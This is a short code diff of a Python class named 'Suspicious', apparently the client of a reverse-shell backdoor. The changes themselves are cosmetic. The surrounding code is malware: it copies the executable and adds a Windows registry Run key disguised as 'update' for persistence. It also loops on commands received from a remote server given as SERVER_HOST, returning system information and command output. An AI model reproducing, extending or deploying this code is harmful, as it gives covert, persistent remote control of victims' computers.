@@ -22,7 +22,7 @@ class Suspicious:
         if not os.path.exists(piece_of_cake):
             shutil.copy(sys.executable, piece_of_cake)
             subprocess.call(
-                f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "{piece_of_cake}"', shell=True)
+                rf'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "{piece_of_cake}"', shell=True)
 
     @staticmethod
     def handleErrorDataSendType(self, error):
@@ -105,8 +105,6 @@ class Suspicious:
                 data_received = self.receive_data()
                 if data_received[0].lower() == 'exit':
                     break
-                    # self.connetion.close()
-                    # sys.exit()
                 elif data_received[0] == 'what':
                     command_result = self.getSystemInfo()
                 elif data_received[0].lower() == 'cd' and len(data_received) > 1:
@@ -130,7 +128,6 @@ class Suspicious:
                 self.send_data(str(error))
                 self.send_data(
                     "---- [=] Error while executing command [=] ----")
-                # self.send_data("---- [=] Connection is still intact though [=] ----")
 
 
 SERVER_HOST = sys.argv[1]
